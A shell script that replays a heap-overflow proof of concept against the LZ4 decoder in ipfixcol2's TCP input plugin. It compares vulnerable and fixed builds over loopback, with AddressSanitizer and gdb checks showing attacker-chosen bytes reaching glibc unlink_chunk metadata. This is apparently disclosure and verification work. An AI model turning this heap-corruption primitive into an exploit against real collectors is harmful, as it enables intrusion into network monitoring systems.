#!/bin/sh
# Loopback TCP replay of CVE-2026-122127 against the ipfixcol2 TCP input
# plugin's REAL decoder and consumer sources. No daemon-wide libfds build is
# needed: Lz4Decoder/DecodeBuffer/ByteVector/read_until_n are compiled verbatim
# from pinned upstream tags v2.8.0 (vulnerable) and v2.9.0 (fixed), with only
# the two ABI shims in shims/. All traffic stays on 127.0.0.1:0.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p out
rm -f out/*.log out/trace.txt out/trace.sha256

fail=0
trace=out/trace.txt
: > "$trace"

check() {
    if [ "$1" -eq 0 ]; then
        printf 'PASS %s\n' "$2" >> "$trace"
    else
        printf 'FAIL %s\n' "$2" >> "$trace"
        fail=$((fail + 1))
    fi
}
present() { grep -q "$2" "$1" 2>/dev/null; }
val() { grep -m1 -o "$2=[^ ]*" "$1" 2>/dev/null | cut -d= -f2-; }
run_asan() {
    ASAN_OPTIONS=detect_leaks=0 timeout 25s "./out/$1" "out/wire-$2.bin" \
        > "out/$1_$2.log" 2>&1
    return $?
}
run_plain() {
    timeout 25s "./out/$1" "out/wire-$2.bin" > "out/$1_$2.log" 2>&1
    return $?
}
run_gdb() {
    gdb -q -batch -ex 'set pagination off' \
        -ex "run out/wire-$2.bin" -ex 'bt 6' \
        -ex 'info registers rip rax rdi rsi' \
        "./out/$1" > "out/$1_$2.gdb.log" 2>&1
    return $?
}

sh stage.sh > /dev/null || exit 1

# --- pinned bytes -----------------------------------------------------------
python3 gen_wire.py > /dev/null
{
    sha256sum v280/*.cpp v280/*.hpp v290/*.cpp v290/*.hpp shims/*.h \
        driver.cpp gen_wire.py run.sh stage.sh
} >> "$trace" 2>/dev/null

CXX='g++ -O0 -fno-inline -fno-omit-frame-pointer -g -std=gnu++17'
LIB=/usr/lib/x86_64-linux-gnu/liblz4.so.1
$CXX -fsanitize=address -I v280 -I shims -o out/vuln_asan \
    v280/Lz4Decoder.cpp v280/DecodeBuffer.cpp v280/ByteVector.cpp driver.cpp $LIB \
&& $CXX -fsanitize=address -I v290 -I shims -o out/fixed_asan \
    v290/Lz4Decoder.cpp v290/DecodeBuffer.cpp v290/ByteVector.cpp driver.cpp $LIB \
&& $CXX -I v280 -I shims -o out/vuln_plain \
    v280/Lz4Decoder.cpp v280/DecodeBuffer.cpp v280/ByteVector.cpp driver.cpp $LIB \
&& $CXX -I v290 -I shims -o out/fixed_plain \
    v290/Lz4Decoder.cpp v290/DecodeBuffer.cpp v290/ByteVector.cpp driver.cpp $LIB
check $? builds

# --- ASan: vulnerable fault, fixed rejection, clean benign control ---------
run_asan vuln_asan attack; varc=$?
if [ "$varc" -ne 0 ] &&
   present out/vuln_asan_attack.log 'ERROR: AddressSanitizer: heap-buffer-overflow' &&
   present out/vuln_asan_attack.log 'WRITE of size 65000' &&
   present out/vuln_asan_attack.log '0 bytes after 24-byte region' &&
   present out/vuln_asan_attack.log 'Lz4Decoder.cpp:145' &&
   present out/vuln_asan_attack.log 'Lz4Decoder.cpp:184'; then c=0; else c=1; fi
check $c rung3_loopback_asan_overflow_pinned_lines

run_asan fixed_asan attack; farc=$?
if [ "$(val out/fixed_asan_attack.log decode_ok)" = 0 ] &&
   present out/fixed_asan_attack.log 'invalid decompressed size' &&
   ! present out/fixed_asan_attack.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c fixed_asan_rejects_declared_size

run_asan vuln_asan benign
if [ "$(val out/vuln_asan_benign.log decode_ok)" = 1 ] &&
   [ "$(val out/vuln_asan_benign.log decoded_bytes)" = 24 ] &&
   ! present out/vuln_asan_benign.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c benign_asan_decode_clean

# --- Plain fixed build: rejection without a sanitizer ----------------------
run_plain fixed_plain attack
if [ "$(val out/fixed_plain_attack.log decode_ok)" = 0 ] &&
   present out/fixed_plain_attack.log 'invalid decompressed size'; then c=0; else c=1; fi
check $c fixed_plain_rejects_declared_size

# --- Stock allocator: chosen bytes in glibc metadata -----------------------
run_gdb vuln_plain attack
if present out/vuln_plain_attack.gdb.log 'in unlink_chunk' &&
   present out/vuln_plain_attack.gdb.log '0x5a5a5a5a5a5a5a58'; then c=0; else c=1; fi
check $c stock_0x5a_in_glibc_unlink_size

run_gdb vuln_plain attack_diff
if present out/vuln_plain_attack_diff.gdb.log 'in unlink_chunk' &&
   present out/vuln_plain_attack_diff.gdb.log '0x4141414141414140'; then c=0; else c=1; fi
check $c stock_0x41_differential_in_glibc_unlink_size

run_gdb vuln_plain attack_crafted
if present out/vuln_plain_attack_crafted.gdb.log 'unlink_chunk+39' &&
   present out/vuln_plain_attack_crafted.gdb.log '0x4141414141414141'; then c=0; else c=1; fi
check $c stock_chosen_ptr_bytes_dereferenced_by_unlink

run_plain vuln_plain benign
if [ "$(val out/vuln_plain_benign.log decode_ok)" = 1 ] &&
   [ "$(val out/vuln_plain_benign.log decoded_bytes)" = 24 ]; then c=0; else c=1; fi
check $c benign_plain_decode_clean

# --- loopback-only evidence -------------------------------------------------
printf 'loopback_bind=%s\n' \
    "$(grep -m1 -o 'bind=127.0.0.1' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_error=%s\n' \
    "$(grep -m1 -o 'ERROR: AddressSanitizer: heap-buffer-overflow' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_write=%s\n' \
    "$(grep -m1 -o 'WRITE of size [0-9]*' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_region=%s\n' \
    "$(grep -m1 -o '0 bytes after 24-byte region' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_decompress_frame=%s\n' \
    "$(grep -m1 -o 'Lz4Decoder.cpp:145' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_alloc_frame=%s\n' \
    "$(grep -m1 -o 'Lz4Decoder.cpp:184' out/vuln_asan_attack.log)" >> "$trace"
printf 'asan_start_header_frame=%s\n' \
    "$(grep -m1 -o 'Lz4Decoder.cpp:131' out/vuln_asan_attack.log)" >> "$trace"
printf 'stock_attack_rax=%s\n' \
    "$(grep -m1 -o 'rax[[:space:]]*0x5a5a5a5a5a5a5a58' out/vuln_plain_attack.gdb.log | tr -s ' ')" >> "$trace"
printf 'stock_diff_rax=%s\n' \
    "$(grep -m1 -o 'rax[[:space:]]*0x4141414141414140' out/vuln_plain_attack_diff.gdb.log | tr -s ' ')" >> "$trace"
printf 'stock_crafted_rip=%s\n' \
    "$(grep -m1 -o '<unlink_chunk+39>' out/vuln_plain_attack_crafted.gdb.log)" >> "$trace"
printf 'stock_crafted_rax=%s\n' \
    "$(grep -m1 -o 'rax[[:space:]]*0x4141414141414141' out/vuln_plain_attack_crafted.gdb.log | tr -s ' ')" >> "$trace"
printf 'fixed_exception=%s\n' \
    "$(grep -m1 -o 'invalid decompressed size' out/fixed_asan_attack.log)" >> "$trace"
printf 'checks=%s\n' "$(grep -c '^PASS ' "$trace")" >> "$trace"
printf 'failures=%s\n' "$fail" >> "$trace"
sha256sum "$trace" | cut -d' ' -f1 > out/trace.sha256
printf '%s\n' "$(cat out/trace.sha256)"
[ "$fail" -eq 0 ]
